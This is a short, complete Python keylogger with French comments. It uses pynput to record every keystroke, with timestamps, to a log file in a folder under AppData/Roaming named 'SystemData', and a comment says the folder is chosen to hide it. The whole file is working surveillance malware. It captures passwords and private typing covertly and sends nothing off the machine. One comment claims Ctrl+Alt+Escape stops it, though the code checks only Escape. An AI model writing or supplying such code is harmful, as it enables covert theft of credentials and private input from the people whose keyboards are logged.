from pynput.keyboard import Key, Listener
import logging
import os


# On le cache dans AppData 
folder = os.path.expanduser("~") + "/AppData/Roaming/SystemData/"
if not os.path.exists(folder):
    os.makedirs(folder)

log_file = folder + "key_log.txt"

# Configuration du logging 
logging.basicConfig(filename=log_file, level=logging.DEBUG, format='%(asctime)s: %(message)s')

def on_press(key):
    # Log la touche directement via le module logging
    logging.info(str(key))

def on_release(key):
    # Ctrl + Alt + Escape stop le script 
    if key == Key.esc:
        return False

# Lancement de l'écouteur
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()